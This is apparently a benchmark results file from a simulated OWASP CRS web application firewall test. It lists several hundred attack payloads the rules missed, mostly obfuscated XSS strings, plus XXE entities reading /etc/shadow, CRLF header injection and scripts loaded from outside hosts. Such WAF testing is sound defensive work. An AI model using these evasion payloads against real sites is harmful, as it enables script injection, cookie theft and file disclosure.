@@ -1,0 +1,936 @@
+=== Simulated OWASP CRS WAF Benchmark Results ===
+Total Payloads: 8666
+Detected:       7737 (89.28%)
+Missed:         929
+==================================================
+
+--- MISSED PAYLOADS ---
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<img src="mocha:document.vulnerable=true;">
+<;IMG ";";";>;<;SCRIPT>;alert(";XSS";)<;/SCRIPT>;";>;
+¼script¾alert(¢XSS¢)¼/script¾
+<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
+'';!--"<XSS>=&{()}
+<img src="http://38.media.tumblr.com/tumblr_ls64yimLuz1r0ix14o1_400.gif"></img>
+&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
+<style type="text/javascript">document.vulnerable=true;</style>
+&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+.cookie
+<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
+On Mouse Over​
+confirm("test")
+eval(
+";a=prompt,a()//
+&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
+alert(document.cookie)
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
+&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<div id="x">XXX</div><style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
+perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
+<script src="//brutelogic.com.br&sol;1.js&num;
+&#000060
+left:expr&#x0065;ssion(alert('XSS'))
+<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
+\'-alert(1)//
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser
+&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
+<br><br><br><br><br><br><x id=x>#x
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+"'%25u003e%25u003cscript%25u003econfirm(42)%25u003c/script%25u003e
+žscriptualert(EXSSE)ž/scriptu
+&#X03c;
+&#x003C
+<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;
+alert&#x28;1&#x29
+"onerror
+';a=prompt,a()//
+&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+left:\ff45\ff58\ff50\ff52\ff45\ff53\ff53\ff49\ff4f\ff4e(alert('XSS'))
+&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+/* INJECTX
+&#60
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<img src="http://31.media.tumblr.com/ae3ef754917fe39e9c1fec441c553c85/tumblr_nsa8jqTm7i1resp2ko1_500.gif"></img>
+<style>//*{x:expression(alert(/xss/))}//<style></style>
+<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
+<?xml version="1.0">
+&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;
+perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out
+&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+\'
+'-alert(1)-'
+"'%u073e%u073cscript%u073ealert(42)%u073c/script%u073e
+&#x003c
+\x3c
+</XSS STYLE=xss:expression(alert('XSS'))>
+&#x03c;
+%25u0722%25u0727%25u073e%25u073cscript%25u073ealert(42)%25u073c/script%25u073e
+<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
+<xml id="xss" src="test.htc"></xml><label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+"'%25253e%25253cscript%25253econfirm(42)%25253c/script%25253e
+&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
+&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&#x3008;script&#x3009;
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
+;
+&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
+<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+&#X003C;
+<div style="font-family:'foo&#10;;color:red;';">XXX
+<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object><object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>
+onclick
+'-alert(document.cookie)-'
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
+<;HTML>;<;BODY>;
+"'>confirm&lpar;1)</Script><Svg><Script/1='
+%u0722%u0727%u073e%u073cscript%u073ealert(42)%u073c/script%u073e
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&#X00003c;
+left:expʀessioⁿ(alert('XSS'))
+al\u0065rt(1)
+'<'/'><'s't'y'l'e'/'o'n'l'o'a'd'='a'l'e'r't('1')'>
+<div style="width: expression(document.vulnerable=true;);">
+"'><///script///>alert(42)</script>
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+<![CDATA[ complete cdata ]]>
+(alert)(1)
+%3C
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+%C0%BCscript%C0%A0src%C0%BD%C0%82mymethod%C0%A8%C0%A9%C0%82%C0%A0%C0%AF%C0%BE
+<img src="http://38.media.tumblr.com/tumblr_m5who6JOEM1rna86e.gif"></img>
+&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
+"'><\script>confirm(42)</script>
+<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
+<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(';XSS';);";>;]]>;
+"'ܾܼscriptܾalert(42)ܼܯscriptܾ
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
+<body style="background-color:red !important;">
+<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
+>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
+&lt;!--&#91;if gte IE 4&#93;&gt;
+setTimeout`alert\x28document.domain\x29`
+xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
+'>//\\,<'>">">"*"
+href="data:                                          text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWNvbmZpcm0oNDIpK0FEc0FQQS0vc2NyaXB0K0FENC0=">obfuscated UTF-7 in base64
+top
+<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
+<;/script>;<;script>;alert(1)<;/script>;
+&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
+<;IMG SRC=";livescript:[code]";>;
+<XSS STYLE="xss:expression(alert('XSS'))">
+&#x000003c;
+&#X03C;
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+&#x00003C
+&#x003c;
+&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+\"
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<IMG SRC="jav	ascript:alert('XSS');">
+http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
+--><!-- close/complete comment -->
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+&#x000003c
+&lt;HTML xmlns:xss&gt;
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
+https://brutelogic.com.br/poc.svg
+location.href=
+&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
+&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
+\\'); alert(\'xss\');var x=\'
+"
+perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
+&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
+&#X00003c
+&#x000003C
+<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+<!doctype html><form><label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label><br><input name="secret" type="password"></form><!-- injection --><svg height="50px"><image xmlns:xlink="http://www.w3.org/1999/xlink"><set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" /><set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" /><set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" /><set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" /></image></svg>
+&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+<meta
+left:expʀessioɴ(alert('XSS'))
+&#X0003c;
+top["al"+"ert"](1)
+&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+left:expr\0065ssion(alert('XSS'))
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
+src=
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
+<BR SIZE="&{alert('XSS')}">
+document.
+&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
+&#x03C;
+&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
+'-document.write`<h1>juniorEXPLOIT</h1>`-'
+<iframe src=http://xss.rocks/scriptlet.html <
+&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
+')>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<;? echo(';<;SCR)';;
+&lt
+&#X0003C;
+exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
+b=\"URL(\\"\";
+<div style="font-family:foo}color=red;">XXX
+"><object+data=javascript%26%63%6f%6c%6f%6e%3b'straccessng'.replace('access',alert)>
+&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+&lt;
+&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
+SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>
+<Input value = "XSS" type = text>
+<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>
+"'%25u073e%25u073cscript%25u073ealert(42)%25u073c/script%25u073e
+"-top['al\x65rt']('sailay')-"
+<INPUT TYPE="BUTTON" action="alert('XSS')"/>
+&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
+<IMG SRC="jav ascript:alert('XSS');">
+&#x0003C;
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+d=\"alert('XSS');\\")\";
+&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
+</body>
+&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
+&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+]]><![CDATA[ close/complete cdata ]]>
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+\x3C
+<embed code=%(scriptlet)s></embed>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+\'-alert(1)//<svg>
+-alert(1)}//\
+");
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<link rel=attachment href="file:///etc/passwd">
+"onclick
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<font style='color:expression(alert(document.cookie))'>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
+"o<x>nmouseover=alert<x>(1)//
+&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+%22;alert%28%27RVRSH3LL_XSS%29//
+top['al\x65rt'](1)
+&#x0003c;
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+left:expr/* */ession(alert('XSS'))
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+INJECTXXXXXXXXXXX
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
+&lt;!&#91;endif&#93;--&gt;
+left:expr&#x65;ssion(alert('XSS'))
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
+<;A HREF=";http://1113982867/";>;XSS<;/A>;
+a="get";
+<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
+<style>*[{}@import'test.css?]{color: green;}</style>X
+</html>
+&#39;&#88;&#83;&#83;&#39;&#41;>
+[color=red width=expression(alert(123))][color]
+1script3document.vulnerable=true;1/script3
+&#X3C;
+<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
+{1==1}"><object+data=javascript%26colon%3b'str1ng'.replace('1',alert)>
+“><s”%2b”cript>alert(document.cookie)</script>
+<;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
+<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(89)"/><animate attributeName="onunload" to="alert(89)"/></svg>
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>
+<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
+top[/al/.source+/ert/.source](1)
+<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
+%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0A%0D%0A%3Cscript
+<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
+INJECTXXXXXXXXXXX "'`();</test>=/* <!-- // #
+<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
+<;IMG&#x0D;SRC&#x0D;=&#x0D;";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;";&#x0D;>;&#x0D;
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+<div style="x:expression((window.r==1)?'':eval('r=1;
+&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
+[1].find(alert)
+&#x27E8;script&#x27E9;
+prompt(document.cookie)
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
+&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+jAvas	Cript:confirm(42)
+<IMG SRC='vbscript:msgbox("XSS")'>
+"'%253e%253cscript%253econfirm(42)%253c/script%253e
+'-confirm`1`-'
+<x style="behavior:url(test.sct)">
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+&#X0003c
+&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
+%252522%252527%25253e%25253cscript%25253econfirm(42)%25253c/script%25253e
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<img src onerror /" '"= alt=alert(106)//">
+<div style="behaviour: url([link to code]);">
+&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()
+&#X000003C;
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
+<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
+&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
+XXX<style>*{color:gre/**/en !/**/important}*{color:red}*{background:url(xx:x //**/\red/*)}</style>
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+%2522%2527%253e%253cscript%253econfirm(42)%253c/script%253e
+&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
+<a alt=42 href=
+&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+<;A HREF=";//google";>;XSS<;/A>;
+&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
+'-alert(1)-'<svg>
+&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;
+&#x3C;
+&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
